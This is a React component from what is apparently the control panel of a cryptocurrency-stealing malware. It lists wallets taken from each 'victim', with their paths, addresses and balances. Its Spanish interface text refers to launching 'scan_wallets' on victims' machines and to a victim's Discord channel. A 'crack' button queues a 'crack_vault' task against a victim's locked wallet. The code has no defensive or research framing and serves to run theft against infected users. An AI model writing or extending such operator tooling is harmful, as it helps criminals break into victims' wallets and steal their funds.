'use client';
import { useState } from 'react';
import { toast } from 'sonner';
import { Copy, KeyRound, RefreshCw } from 'lucide-react';
import type { Wallet } from '@/lib/types';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { balanceNumber, balanceTone, copy, dateTime, mask } from '@/lib/format';
import { mutate } from '@/hooks/useApi';
import { useCanWrite } from '@/components/live-provider';
import { cn } from '@/lib/cn';
import { humanError } from '@/lib/errors';

const tone = (state: string) => state === 'decrypted' ? 'ok' : state === 'locked' ? 'warn' : state === 'corrupt' ? 'bad' : 'default';

export function WalletTable({ victimId, items, loading, refresh, linked = true }: { victimId: string; items: Wallet[]; loading: boolean; refresh: () => void; linked?: boolean }) {
  const [busy, setBusy] = useState('');
  const canWrite = useCanWrite();
  if (loading) return <SkeletonRows rows={6} cols={6} />;
  if (items.length === 0) return <Empty title="Sin wallets" hint="Lanza scan_wallets para enumerar extensiones y almacenes de escritorio." />;

  async function crack(wallet: Wallet) {
    setBusy(wallet.id);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victimId], name: 'crack_vault', params: { target: wallet.targetId }, timeout_sec: 180 });
      toast.success('Descifrado en cola');
    } catch (error) {
      toast.error(humanError(error) || 'No se pudo encolar');
    } finally {
      setBusy('');
    }
  }

  return (
    <Table>
      <THead><TR><TH>Target</TH><TH>Tipo</TH><TH>Ruta</TH><TH>Estado</TH><TH>Dirección</TH><TH>Saldo</TH><TH>Visto</TH><TH /></TR></THead>
      <tbody>
        {items.map((wallet) => (
          <TR key={wallet.id}>
            <TD className="font-mono text-xs">{wallet.targetId}</TD>
            <TD><Badge>{wallet.kind}</Badge></TD>
            <TD className="max-w-[380px] truncate font-mono text-2xs text-muted" title={wallet.path}>{wallet.path}</TD>
            <TD><Badge tone={tone(wallet.state)}>{wallet.state}</Badge>{wallet.reason ? <span className="ml-1 text-2xs text-muted">{wallet.reason}</span> : null}</TD>
            <TD className="font-mono text-2xs">{wallet.address ? <button className="flex items-center gap-1 text-brand" onClick={() => copy(wallet.address!)}>{mask(wallet.address, 12)} <Copy className="h-2.5 w-2.5" /></button> : '—'}</TD>
            <TD className={cn('num', balanceTone(balanceNumber(wallet.balance)))}>{wallet.balance ?? '—'}</TD>
            <TD className="num text-2xs text-muted">{dateTime(wallet.createdAt)}</TD>
            <TD>
              {wallet.state === 'locked' ? (
                <Button size="sm" variant="secondary" title={linked ? undefined : 'La víctima no tiene canal de Discord'} loading={busy === wallet.id} disabled={!canWrite || !linked} onClick={() => crack(wallet)}><KeyRound className="h-3 w-3" /> crack</Button>
              ) : <Button size="icon" variant="ghost" onClick={refresh}><RefreshCw className="h-3 w-3" /></Button>}
            </TD>
          </TR>
        ))}
      </tbody>
    </Table>
  );
}
